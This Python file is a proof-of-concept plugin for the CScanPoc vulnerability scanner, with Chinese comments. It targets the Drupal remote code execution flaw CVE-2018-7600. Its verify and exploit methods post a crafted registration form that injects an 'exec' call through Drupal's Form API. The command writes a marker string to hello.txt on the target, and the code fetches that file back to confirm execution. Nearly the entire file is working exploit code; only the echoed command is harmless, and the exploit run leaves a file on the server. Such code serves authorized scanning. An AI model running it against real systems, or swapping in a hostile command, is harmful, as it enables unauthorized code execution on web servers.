# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Drupal_0001'  # 平台漏洞编号，留空
    name = 'Drupal核心远程代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-3-28'  # 漏洞公布时间
    desc = '''
        Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-06660'  # 漏洞来源
    cnvd_id = 'CNVD-2018-06660'  # cnvd漏洞编号
    cve_id = 'CVE-2018-7600'  # cve编号
    product = 'Drupal'  # 漏洞应用名称
    product_version = 'Drupal6、Drupal7、Drupal8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'da4541c6-5a10-425a-b512-049379e5d993'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 根据传入命令的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                       'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "c4ca4238a0b923820dcc509a6f75849b" | tee hello.txt'}
            res = s.post(
                self.target+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload)
            r = s.get(self.target+'/hello.txt')
            # print(r.text)
            if 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 根据传入命令的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                       'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "c4ca4238a0b923820dcc509a6f75849b" | tee hello.txt'}
            res = s.post(
                self.target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload)
            verify_url = self.target + '/hello.txt'
            r = s.get(verify_url)
            # print(r.text)
            if 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，在该验证过程中上传了文件地址为:{url},请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
